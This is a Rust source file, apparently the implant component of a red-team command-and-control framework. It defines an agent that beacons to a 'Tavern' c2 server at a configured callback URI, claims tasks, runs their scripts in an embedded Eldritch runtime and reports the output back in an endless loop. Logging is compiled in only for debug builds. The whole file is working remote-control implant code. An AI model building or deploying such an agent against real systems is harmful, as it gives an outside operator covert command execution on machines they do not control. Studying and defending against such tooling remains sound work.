use crate::{config::Config, task::TaskHandle};
use anyhow::Result;
use c2::{
    pb::{Beacon, ClaimTasksRequest},
    TavernClient,
};
use eldritch::Runtime;
use std::time::{Duration, Instant};

/*
 * Agent contains all relevant logic for managing callbacks to a c2 server.
 * It is responsible for obtaining tasks, executing them, and returning their output.
 */
pub struct Agent {
    info: Beacon,
    tavern: TavernClient,
    handles: Vec<TaskHandle>,
}

impl Agent {
    /*
     * Initialize an agent using the provided configuration.
     */
    pub async fn gen_from_config(cfg: Config) -> Result<Agent> {
        let tavern = TavernClient::connect(cfg.callback_uri).await?;

        Ok(Agent {
            info: cfg.info,
            tavern,
            handles: Vec::new(),
        })
    }

    // Claim tasks and start their execution
    async fn claim_tasks(&mut self) -> Result<()> {
        let tasks = self
            .tavern
            .claim_tasks(ClaimTasksRequest {
                beacon: Some(self.info.clone()),
            })
            .await?
            .into_inner()
            .tasks;

        #[cfg(debug_assertions)]
        log::info!("claimed {} tasks", tasks.len());

        for task in tasks {
            let tome = match task.tome {
                Some(t) => t,
                None => {
                    continue;
                }
            };

            let (runtime, output) = Runtime::new();
            let handle = tokio::task::spawn_blocking(move || runtime.run(tome));
            self.handles.push(TaskHandle::new(task.id, output, handle));

            #[cfg(debug_assertions)]
            log::info!("spawned task execution for id={}", task.id);
        }
        Ok(())
    }

    // Report task output, remove completed tasks
    async fn report(&mut self) -> Result<()> {
        // Report output from each handle
        let mut idx = 0;
        while idx < self.handles.len() {
            // Drop any handles that have completed
            if self.handles[idx].is_finished() {
                let mut handle = self.handles.remove(idx);
                handle.report(&mut self.tavern).await?;
                continue;
            }

            // Otherwise report and increment
            self.handles[idx].report(&mut self.tavern).await?;
            idx += 1;
        }

        Ok(())
    }

    /*
     * Callback once using the configured client to claim new tasks and report available output.
     */
    pub async fn callback(&mut self) -> Result<()> {
        self.claim_tasks().await?;
        self.report().await?;

        Ok(())
    }

    /*
     * Callback indefinitely using the configured client to claim new tasks and report available output.
     */
    pub async fn callback_loop(&mut self) {
        loop {
            let start = Instant::now();

            match self.callback().await {
                Ok(_) => {}
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("callback failed: {}", _err);
                }
            };

            let interval = self.info.interval.clone();
            let delay = match interval.checked_sub(start.elapsed().as_secs()) {
                Some(secs) => Duration::from_secs(secs),
                None => Duration::from_secs(0),
            };

            #[cfg(debug_assertions)]
            log::info!(
                "completed callback in {}s, sleeping for {}s",
                start.elapsed().as_secs(),
                delay.as_secs()
            );

            std::thread::sleep(delay);
        }
    }
}
